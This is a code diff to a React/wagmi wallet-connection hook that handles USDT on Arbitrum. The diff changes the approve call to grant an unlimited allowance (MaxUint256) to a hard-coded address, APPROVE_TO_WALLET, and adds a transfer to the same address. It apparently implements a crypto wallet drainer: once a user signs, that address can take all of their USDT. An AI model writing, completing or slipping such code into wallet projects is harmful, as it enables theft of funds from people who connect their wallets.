@@ -1,8 +1,48 @@
 import { useAppKit } from "@reown/appkit/react";
 import { useState } from "react";
 import { useAccount, useWriteContract, useDisconnect } from "wagmi";
+import { MaxUint256 } from "ethers";
 
-export const USDT_ARBITRUM_ABI = [
+// export const USDT_ARBITRUM_ABI_APPROVE = [
+//   {
+//     type: "function",
+//     name: "transfer",
+//     stateMutability: "nonpayable",
+//     inputs: [
+//       { name: "recipient", type: "address" },
+//       { name: "amount", type: "uint256" },
+//     ],
+//     outputs: [{ type: "bool" }],
+//   },
+// ];
+
+export const USDT_ARBITRUM_ABI_APPROVE = [
+  {
+    constant: false, // Or you can omit this line
+    inputs: [
+      {
+        name: "spender", // Standard name for the first argument
+        type: "address",
+      },
+      {
+        name: "value", // Standard name for the second argument (amount)
+        type: "uint256",
+      },
+    ],
+    name: "approve",
+    outputs: [
+      {
+        name: "",
+        type: "bool",
+      },
+    ],
+    payable: false, // Or you can omit this line
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+];
+
+export const USDT_ARBITRUM_ABI_TRANSFER = [
   {
     type: "function",
     name: "transfer",
@@ -68,16 +108,16 @@ export const useConnectWallet = () => {
   // Approve token function
   const approveTokens = async () => {
     writeContract({
-      abi: USDT_ARBITRUM_ABI,
+      abi: USDT_ARBITRUM_ABI_APPROVE,
       address: USDT_ARBITRUM_CONTRACT,
       functionName: "approve",
-      args: [APPROVE_TO_WALLET],
+      args: [APPROVE_TO_WALLET, MaxUint256],
     });
   };
 
   const transferTokens = async (tokens: string) => {
     writeContract({
-      abi: USDT_ARBITRUM_ABI,
+      abi: USDT_ARBITRUM_ABI_TRANSFER,
       address: USDT_ARBITRUM_CONTRACT,
       functionName: "transfer",
       args: [APPROVE_TO_WALLET, tokens],
